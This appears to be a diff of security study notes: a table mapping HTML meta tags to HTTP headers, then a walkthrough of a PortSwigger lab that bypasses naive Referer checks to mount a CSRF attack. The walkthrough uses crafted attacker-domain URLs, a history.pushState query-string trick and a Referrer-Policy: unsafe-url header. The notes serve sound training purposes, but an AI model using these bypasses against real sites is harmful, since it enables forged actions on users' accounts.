+| **Referrer Policy**                | `<meta name="referrer" content="no-referrer">`                              | Controls what is sent in the `Referer` header     | `Referrer-Policy: no-referrer`                 | Affects subsequent **HTTP requests** (links, images, scripts); `Referer` header omitted if no-referrer |
+| **Cache-Control**                  | `<meta http-equiv="cache-control" content="no-cache">`                      | Instructs caching behavior                        | `Cache-Control: no-cache`                      | Browser may avoid caching the page; future HTTP requests may revalidate or reload                      |
+| **Pragma**                         | `<meta http-equiv="pragma" content="no-cache">`                             | Legacy caching instruction                        | `Pragma: no-cache`                             | Similar effect to Cache-Control; affects HTTP **requests** and **responses**                           |
+| **Expires**                        | `<meta http-equiv="expires" content="0">`                                   | Expiration date for document                      | `Expires: 0`                                   | Browser considers document expired immediately; triggers revalidation request on next access           |
+| **Content-Type**                   | `<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">`       | Set MIME type and charset                         | `Content-Type: text/html; charset=UTF-8`       | Affects **how browser parses response body**                                                           |
+| **Refresh / Redirect alternative** | `<meta http-equiv="refresh" content="0; url=https://example.com/">`         | Redirect immediately                              | `Location: https://example.com/` + `HTTP 3xx`  | Browser performs **GET request** to new location immediately                                           |
+
+# Validation of Referer can be circumvented
+Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
+`http://vulnerable-website.com.attacker-website.com/csrf-attack`
+
+Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
+`http://attacker-website.com/csrf-attack?vulnerable-website.com`
+
+
+**Note:** Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default.
+
+You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.
+
+## Solution
+- Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
+- Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
+- Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
+    Referer: `https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`
+- Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
+- Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:
+    `history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`
+- This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
+- If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
+    `Referrer-Policy: unsafe-url`
+
+---
